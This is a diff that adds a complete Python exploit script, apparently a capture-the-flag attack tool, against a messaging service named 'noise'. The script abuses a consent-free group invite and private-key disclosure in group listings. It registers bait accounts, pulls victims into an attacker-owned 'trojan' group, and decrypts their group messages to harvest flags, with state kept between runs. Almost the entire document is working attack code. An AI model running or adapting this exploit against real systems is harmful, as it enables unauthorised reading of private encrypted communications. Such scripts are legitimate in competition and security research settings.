@@ -1,0 +1,363 @@
+#!/usr/bin/env python3
+"""noise thrower -- the invite direction.  usage: ./noise-invite.py <ip> <flag_id> [port]
+
+Two facts in noise/service.py + noise/db.py, both reachable from an ordinary
+account, and neither touched by the obvious authz hardening:
+
+  1. invite() authorises the CALLER against the TARGET group and nothing else:
+         group = db.get_group_by_id(gid)        # must exist
+         ...                                    # caller must be in `gid`
+         db.create_group_member(gid, invitee.id)
+     Being a member of *your own* group is therefore sufficient to add
+     *anybody else* to it. Consent, ownership and who the invitee is are never
+     consulted, so the check only ever constrains the inbound direction.
+
+  2. db.get_user_groups() -- what LIST_GROUPS returns -- selects `g.priv` and
+     builds GroupSecret(..., privkey=...). EVERY member of a group is handed
+     that group's RSA private key, and group message bodies are encrypted to
+     the group key. So membership, acquired in either direction, is a full read.
+
+Two chains follow, and this script runs both every tick:
+
+  A. bait    register spare users so we are well represented in LIST_USERS.
+             When the target adds one of them to a group -- checkers routinely
+             invite an enumerated existing user to exercise the invite path --
+             that bait's LIST_GROUPS yields the *real* group's private key, so
+             every message in it decrypts wherever the flag was posted.
+  B. trojan  create a group we own and invite the target into it. Their client
+             then lists our group among its own, so anything it posts
+             group-wide lands in a group whose privkey we have held all along.
+
+Both chains have to outlive a single tick, so identities persist in a JSON file
+beside the script. Only flag-shaped strings reach stdout; diagnostics are
+stderr, and one uncooperative group or user never ends the run.
+"""
+import base64
+import json
+import os
+import random
+import re
+import socket
+import string
+import struct
+import sys
+
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
+
+HOST = sys.argv[1]
+FID = sys.argv[2] if len(sys.argv) > 2 else ""
+PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 6426
+
+FLAG = re.compile(r"[A-Z0-9]{31}=")
+OAEP = padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None)
+HDR = struct.Struct("!4sBBBI")  # magic, version, flags, opcode, payload_len
+REGISTER, LIST_USERS, CHALLENGE = 1, 2, 3
+CREATE_GROUP, GROUP_CHALLENGE, INVITE = 6, 7, 8
+LIST_GROUPS, GROUP_MSGS, ALL_GROUPS = 9, 11, 12
+
+STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".noise-invite.json")
+BAIT_TARGET = 6   # bait identities to keep registered per target
+INVITE_CAP = 40   # invites per run, so one tick cannot stall on a huge user table
+
+
+def log(fmt, *a):
+    print(fmt % a if a else fmt, file=sys.stderr)
+
+
+# --- wire -------------------------------------------------------------------
+
+
+class ApiErr(RuntimeError):
+    def __init__(self, code, msg):
+        super().__init__("%d: %s" % (code, msg))
+        self.code, self.msg = code, msg
+
+
+class R:
+    """Reader for the NOIZ codec: u32 ints and u32-length-prefixed utf-8."""
+
+    def __init__(self, b):
+        self.b, self.i = b, 0
+
+    def u32(self):
+        self.i += 4
+        return struct.unpack_from("!I", self.b, self.i - 4)[0]
+
+    def s(self):
+        n = self.u32()
+        self.i += n
+        return self.b[self.i - n : self.i].decode("utf-8", "replace")
+
+
+class Noise:
+    def __init__(self, host, port, timeout=12.0):
+        self.s = socket.create_connection((host, port), timeout=timeout)
+
+    def close(self):
+        try:
+            self.s.close()
+        except OSError:
+            pass
+
+    def _rx(self, n):
+        b = b""
+        while len(b) < n:
+            c = self.s.recv(n - len(b))
+            if not c:
+                raise ConnectionError("peer closed after %d/%d bytes" % (len(b), n))
+            b += c
+        return b
+
+    def call(self, op, *fields):
+        """int field -> bare u32 (ids); bytes field -> u32 length prefix + body."""
+        p = b"".join(
+            struct.pack("!I", f) if isinstance(f, int) else struct.pack("!I", len(f)) + f
+            for f in fields
+        )
+        self.s.sendall(HDR.pack(b"NOIZ", 1, 0, op, len(p)) + p)
+        magic, ver, flags, _op, n = HDR.unpack(self._rx(HDR.size))
+        if magic != b"NOIZ" or ver != 1:
+            raise RuntimeError("not a NOIZ endpoint on %s:%d" % (HOST, PORT))
+        if n > 1 << 20:
+            raise RuntimeError("bogus frame length %d" % n)
+        r = R(self._rx(n))
+        if flags == 2:
+            # Error frame is u16 status + length-prefixed text. The whole frame
+            # is already consumed, so the stream stays aligned and the caller
+            # can keep using this connection after catching us.
+            raise ApiErr(struct.unpack_from("!H", r.b, 0)[0], r.b[6:].decode("utf-8", "replace"))
+        return r
+
+
+# --- crypto -----------------------------------------------------------------
+
+
+def keypair(bits=2048):
+    k = rsa.generate_private_key(65537, bits)
+    pub = base64.urlsafe_b64encode(
+        k.public_key().public_bytes(
+            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
+        )
+    ).decode()
+    priv = base64.urlsafe_b64encode(
+        k.private_bytes(
+            serialization.Encoding.DER,
+            serialization.PrivateFormat.PKCS8,
+            serialization.NoEncryption(),
+        )
+    ).decode()
+    return pub, priv
+
+
+def loadpriv(priv64):
+    return serialization.load_der_private_key(base64.urlsafe_b64decode(priv64), None)
+
+
+def bearer(c, pub, priv):
+    """CHALLENGE seals a bearer token to the subject's own key -- answer it honestly."""
+    ch = c.call(CHALLENGE, pub.encode()).s()
+    return loadpriv(priv).decrypt(base64.urlsafe_b64decode(ch), OAEP).decode()
+
+
+def name():
+    return "".join(random.choices(string.ascii_lowercase, k=3)) + "".join(
+        random.choices(string.ascii_lowercase + string.digits, k=5)
+    )
+
+
+# --- state ------------------------------------------------------------------
+
+
+def load_state():
+    try:
+        with open(STATE) as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+
+def save_state(st):
+    try:
+        tmp = STATE + ".tmp"
+        with open(tmp, "w") as f:
+            json.dump(st, f)
+        os.replace(tmp, STATE)
+    except Exception as e:
+        log("could not persist state: %s", e)
+
+
+# --- chains -----------------------------------------------------------------
+
+
+def harvest(c, bait, out):
+    """Read every group this identity is in; membership carries the privkey."""
+    try:
+        tok = bearer(c, bait["pub"], bait["priv"])
+    except Exception as e:
+        log("uid %s auth: %s", bait.get("uid"), e)
+        return
+    try:
+        r = c.call(LIST_GROUPS, tok.encode())
+        # Read all four fields of every row before acting on any of them, or the
+        # reader desynchronises and the rest of the list is garbage.
+        groups = [(r.u32(), r.s(), r.s(), r.s()) for _ in range(r.u32())]
+    except ConnectionError:
+        raise
+    except Exception as e:
+        log("uid %s LIST_GROUPS: %s", bait.get("uid"), e)
+        return
+    for gid, _gname, gpub, gpriv in groups:
+        try:
+            key = loadpriv(gpriv)
+            sealed = c.call(GROUP_CHALLENGE, gpub.encode()).s()
+            gtok = key.decrypt(base64.urlsafe_b64decode(sealed), OAEP).decode()
+            m = c.call(GROUP_MSGS, gtok.encode())
+            for _ in range(m.u32()):
+                m.u32()
+                m.s()
+                m.s()
+                body = m.s()
+                try:
+                    pt = key.decrypt(base64.urlsafe_b64decode(body), OAEP).decode("utf-8", "replace")
+                except Exception:
+                    continue  # posted under a different key, or not ours to read
+                out.update(FLAG.findall(pt))
+        except ConnectionError:
+            raise
+        except Exception as e:
+            log("gid %s: %s", gid, e)
+
+
+def targets(c, mine):
+    """Who to pull into the trojan group, best guess first.
+
+    A noise flag id is a small ascending record id, so it can name either a user
+    or a group; chase both rather than letting one shadow the other, then fall
+    back to the newest users since a checker mints fresh identities each tick.
+    """
+    users, groups = [], []
+    try:
+        r = c.call(LIST_USERS)
+        users = [(r.u32(), r.s(), r.s()) for _ in range(r.u32())]
+    except Exception as e:
+        log("LIST_USERS: %s", e)
+    try:
+        r = c.call(ALL_GROUPS)
+        groups = [(r.u32(), r.s(), r.s(), r.u32()) for _ in range(r.u32())]
+    except Exception as e:
+        log("LIST_ALL_GROUPS: %s", e)
+
+    want = [u for u, n, _p in users if FID in (str(u), n)]
+    want += [owner for gid, gn, gp, owner in groups if FID in (str(gid), gn, gp)]
+    want += [u for u, _n, _p in sorted(users, reverse=True)]
+    seen, out = set(), []
+    for u in want:
+        if u in mine or u in seen:
+            continue
+        seen.add(u)
+        out.append(u)
+    return out
+
+
+def seed(c, me):
+    """Create a group we own and invite the target in -- chain B."""
+    bait = me["bait"]
+    tro = me.get("trojan")
+    if tro:
+        owner = next((b for b in bait if b["uid"] == tro.get("owner")), None)
+        if owner is None:
+            me["trojan"] = tro = None
+    if not tro:
+        owner = bait[0]
+        try:
+            tok = bearer(c, owner["pub"], owner["priv"])
+            r = c.call(CREATE_GROUP, tok.encode(), name().encode())
+            gid, _n, gpub, gpriv = r.u32(), r.s(), r.s(), r.s()
+            me["trojan"] = tro = {"gid": gid, "pub": gpub, "priv": gpriv, "owner": owner["uid"]}
+        except Exception as e:
+            log("create_group: %s", e)
+            return
+
+    mine = {b["uid"] for b in bait}
+    try:
+        tok = bearer(c, owner["pub"], owner["priv"])
+    except Exception as e:
+        log("trojan owner auth: %s", e)
+        return
+    done = set(me.get("invited", []))
+    sent = 0
+    for uid in targets(c, mine):
+        if sent >= INVITE_CAP:
+            break
+        if uid in done:
+            continue
+        try:
+            c.call(INVITE, tok.encode(), tro["gid"], uid)
+            done.add(uid)
+            sent += 1
+        except ConnectionError:
+            raise
+        except ApiErr as e:
+            if e.code == 404 and "group" in e.msg:
+                # our group is gone (service restarted onto a fresh DB); rebuild
+                # it next run rather than burning the rest of this one.
+                log("trojan group %s vanished: %s", tro["gid"], e)
+                me["trojan"] = None
+                break
+            # 403 "already a member" is the normal steady state -- that uid is
+            # already in, so stop retrying it. A 404 user never comes back
+            # either, since ids only grow.
+            done.add(uid)
+        except Exception as e:
+            log("invite %s: %s", uid, e)
+    me["invited"] = sorted(done)
+    if sent:
+        log("invited %d new uid(s) into trojan gid %s", sent, tro["gid"])
+
+
+# --- run --------------------------------------------------------------------
+
+
+def main():
+    st = load_state()
+    me = st.setdefault(HOST, {})
+    me.setdefault("bait", [])
+    me.setdefault("invited", [])
+    me.setdefault("trojan", None)
+    out = set()
+
+    c = Noise(HOST, PORT)
+    try:
+        # Chain A first: collect whatever landed in our laps since the last tick,
+        # including the trojan group, which the owning bait lists as its own.
+        for bait in me["bait"]:
+            harvest(c, bait, out)
+
+        while len(me["bait"]) < BAIT_TARGET:
+            pub, priv = keypair()
+            try:
+                r = c.call(REGISTER, pub.encode(), name().encode())
+                me["bait"].append({"pub": pub, "priv": priv, "uid": r.u32()})
+            except ConnectionError:
+                raise
+            except Exception as e:
+                log("register: %s", e)
+                break
+
+        if me["bait"]:
+            seed(c, me)
+    finally:
+        c.close()
+        save_state(st)
+
+    for f in sorted(out):
+        print(f)
+    if not out:
+        sys.exit(
+            "no flag recovered from %s (flag_id %r, bait=%d, trojan=%s, invited=%d)"
+            % (HOST, FID, len(me["bait"]), (me.get("trojan") or {}).get("gid"), len(me["invited"]))
+        )
+
+
+main()
